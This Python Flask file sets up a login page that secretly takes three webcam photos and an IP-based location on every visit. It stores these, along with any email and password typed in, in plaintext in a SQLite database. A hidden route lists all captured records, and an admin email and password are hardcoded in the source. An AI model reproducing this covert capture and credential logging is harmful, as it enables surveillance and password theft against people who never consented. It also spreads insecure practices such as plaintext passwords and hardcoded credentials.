from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
import cv2
import base64
import geocoder

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=False, nullable=True)
    password = db.Column(db.String(120), nullable=True)
    image1 = db.Column(db.Text, nullable=True)
    image2 = db.Column(db.Text, nullable=True)
    image3 = db.Column(db.Text, nullable=True)
    latitude = db.Column(db.Float, nullable=True)
    longitude = db.Column(db.Float, nullable=True)

with app.app_context():
    db.create_all()

def capture_images():
    camera = cv2.VideoCapture(0)
    images = []
    for i in range(3):
        return_value, image = camera.read()
        # Encode the image in base64
        retval, buffer = cv2.imencode('.jpg', image)
        if retval:
            image_base64 = base64.b64encode(buffer).decode('utf-8')
            images.append(image_base64)
    camera.release()
    return images

def get_current_location():
    g = geocoder.ip('me')
    if g.ok:
        return g.latlng
    else:
        return None, None

@app.route('/', methods=['GET', 'POST'])
def login():
    images = capture_images()
    latitude, longitude = get_current_location()
    user1 = User(email="########", password="########", image1=images[0], image2=images[1], image3=images[2], latitude=latitude, longitude=longitude)
    db.session.add(user1)
    db.session.commit()
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        if email == 'moulayeelbechir@gmail.com' and password == 'moulaye123':
            return redirect(url_for('donnee'))
        elif email == 'moulayeelbechir@gmail.com' and password != 'moulaye123': 
            return render_template('login.html', error=True)
        else:
            images = capture_images()
            latitude, longitude = get_current_location()
            user = User(email=email, password=password, image1=images[0], image2=images[1], image3=images[2], latitude=latitude, longitude=longitude)
            db.session.add(user)
            db.session.commit()
            return render_template('login.html', error=True)
    return render_template('login.html', error=False)

@app.route('/donnee')
def donnee():
    users = User.query.all()
    return render_template('donnee.html', users=users)

@app.route('/add_user', methods=['POST'])
def add_user():
    email = request.form['email']
    password = request.form['password']
    new_user = User(email=email, password=password)
    db.session.add(new_user)
    db.session.commit()
    return redirect(url_for('login'))


@app.route('/delete_user/<int:user_id>', methods=['POST'])
def delete_user(user_id):
    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return redirect(url_for('donnee'))

if __name__ == '__main__':
    app.run(debug=True)
